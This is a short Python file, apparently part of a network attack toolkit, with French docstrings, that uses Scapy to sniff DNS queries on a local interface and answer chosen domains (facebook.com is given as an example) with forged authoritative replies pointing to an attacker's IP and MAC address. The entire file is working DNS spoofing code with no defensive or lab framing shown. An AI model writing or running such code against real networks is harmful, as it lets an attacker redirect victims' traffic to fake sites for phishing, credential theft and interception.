# dns_spoofer.py

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, sendp
import logging

def spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface):
    """
    Analyse un paquet sniffé et envoie une réponse DNS falsifiée si le domaine est dans la liste.
    """
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # Requête DNS
        queried_domain = pkt[DNSQR].qname.decode().strip(".")  # ex: facebook.com
        victim_ip = pkt[IP].src

        if queried_domain in spoofed_domains:
            print(f"[+] Spoofing DNS response for {queried_domain} → {fake_ip}")

            # Construire la réponse DNS falsifiée
            ether = Ether(src=attacker_mac, dst=pkt[Ether].src)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            dns = DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)
            )

            spoofed_response = ether / ip / udp / dns
            sendp(spoofed_response, iface=iface, verbose=False)

def start_dns_spoofer(spoofed_domains, fake_ip, attacker_mac, iface):
    """
    Démarre le sniffer DNS sur l’interface donnée.
    """
    from scapy.all import sniff

    print("[*] Starting DNS spoofing...")
    print(f"[*] Spoofed domains: {spoofed_domains}")
    print(f"[*] Responding with fake IP: {fake_ip}")

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped by user.")
